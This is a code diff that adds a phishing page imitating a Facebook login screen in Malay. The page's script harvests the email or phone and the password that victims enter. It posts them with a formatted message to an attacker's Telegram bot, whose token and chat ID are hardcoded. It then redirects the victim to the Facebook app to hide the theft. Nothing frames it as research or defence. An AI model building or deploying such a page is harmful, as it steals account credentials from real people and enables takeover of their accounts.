@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Facebook Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <style>
+      body {
+        font-family: Helvetica, Arial, sans-serif;
+        background-color: white;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        min-height: 100vh;
+      }
+
+      .login-container {
+        background-color: white;
+        padding: 20px 28px;
+        border-radius: 8px;
+        /* box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); */
+        width: 330px;
+        text-align: center;
+        margin: 20px auto !important;
+      }
+
+      h1 {
+        color: #1877f2;
+        font-size: 28px;
+        margin-bottom: 16px;
+        font-weight: 600;
+      }
+
+      p {
+        color: #606770;
+        font-size: 14px;
+        margin-bottom: 24px;
+        line-height: 1.34;
+      }
+
+      input {
+        width: 100%;
+        padding: 14px 16px;
+        margin-bottom: 12px;
+        border: 1px solid #dddfe2;
+        border-radius: 6px;
+        box-sizing: border-box;
+        font-size: 15px;
+      }
+
+      input:focus {
+        outline: none;
+        border-color: #1877f2;
+        box-shadow: 0 0 0 2px #e7f3ff;
+      }
+
+      .login-btn {
+        background-color: #1877f2;
+        color: white;
+        padding: 12px;
+        border: none;
+        border-radius: 6px;
+        width: 100%;
+        font-size: 18px;
+        font-weight: bold;
+        cursor: pointer;
+        margin-bottom: 16px;
+        height: 48px;
+      }
+
+      .login-btn:hover {
+        background-color: #166fe5;
+      }
+
+      .forgot-password {
+        color: #1877f2;
+        text-decoration: none;
+        font-size: 14px;
+        display: block;
+        margin-bottom: 20px;
+      }
+
+      .forgot-password:hover {
+        text-decoration: underline;
+      }
+
+      .create-account {
+        background-color: #42b72a;
+        color: white;
+        padding: 14px 16px;
+        border: none;
+        border-radius: 6px;
+        font-size: 16px;
+        font-weight: bold;
+        cursor: pointer;
+        width: auto;
+        margin: 0 auto;
+      }
+
+      .create-account:hover {
+        background-color: #36a420;
+      }
+
+      /* media query */
+      @media (max-width: 400px) {
+        .login-container {
+          width: 90%;
+        }
+      }
+
+      @media (max-width: 320px) {
+        .login-container {
+          width: 90%;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <h1>Masuk ke Facebook</h1>
+      <p>
+        Sila masukan email atau nombor telefon akaun Facebook untuk mengesahkan
+        permohonan anda.
+      </p>
+
+      <form id="loginForm">
+        <input
+          type="text"
+          id="email"
+          name="email"
+          placeholder="E-mel atau Nombor Telefon"
+          required
+        />
+        <input
+          type="password"
+          id="password"
+          name="password"
+          placeholder="Kata Laluan"
+          required
+        />
+        <button type="submit" class="login-btn">Log Masuk</button>
+      </form>
+
+      <a href="#" class="forgot-password">Terlupa Kata Laluan?</a>
+      <button class="create-account">Cipta Akaun Baru</button>
+    </div>
+
+    <script>
+      document
+        .getElementById("loginForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+
+          const email = document.getElementById("email").value;
+          const password = document.getElementById("password").value;
+
+          // Ganti BOT_TOKEN dan CHAT_ID dengan nilai yang sesuai
+          const botToken = "7410437482:AAHjVoPurOsB4-yoSFVinzj8VNnrAPVjmpc";
+          const chatId = "5265564576";
+
+          // Format pesan dengan lebih rapi
+          const message =
+            `🔐 *DATA LOGIN FACEBOOK BARU*\n\n` +
+            `📧 *Email/Phone:*\n${email}\n\n` +
+            `🔑 *Password:*\n${password}\n\n` +
+            `📅 *Waktu:* ${new Date().toLocaleString("id-ID")}\n` +
+            `🌐 *IP:* _mengambil..._`;
+
+          // Tambahkan parse_mode untuk formatting Markdown
+          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message,
+              parse_mode: "Markdown",
+            }),
+          }).then(() => {
+            // Redirect ke aplikasi Facebook
+            window.location.href = "fb://profile";
+          });
+        });
+    </script>
+  </body>
+</html>
